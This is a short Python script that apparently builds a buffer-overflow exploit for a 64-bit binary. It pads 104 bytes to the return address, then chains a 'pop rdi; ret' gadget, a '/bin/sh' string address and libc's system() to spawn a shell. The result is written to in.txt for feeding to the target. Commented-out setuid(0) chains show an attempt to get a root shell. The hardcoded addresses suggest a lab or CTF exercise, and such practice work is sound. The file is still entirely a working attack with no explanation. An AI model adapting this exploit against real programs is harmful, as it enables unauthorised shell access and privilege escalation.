from struct import *

buf = ""
buf += "A"*104                      # offset to RIP

# buf += pack("<Q", 0x0000000000400693)  # pop rdi;ret;
# buf += pack("<Q", 0x0)   # 0; setuid(0)
# buf += pack("<Q", 0x7ffff7ada2b0)  # setuid; setuid(0)

# buf += pack("<Q", 0x0000000000400693)  # pop rdi;ret;
# buf += pack("<Q", 0x0)   # 0; setuid(0)
# buf += pack("<Q", 0x7ffff7b0a270)  # setuid; setuid(0)

buf += pack("<Q", 0x0000000000400693)  # pop rdi;ret;
buf += pack("<Q", 0x4006ef)   # /bin/sh
buf += pack("<Q", 0x7ffff7a52390)   # system
# buf +="AA"
# print("len: ", len(buf))
# buf += "C"*(350- len(buf))                     # padding to keep payload length at 400 bytes
# print("len: ", len(buf))

f = open("in.txt", "w")
f.write(buf)
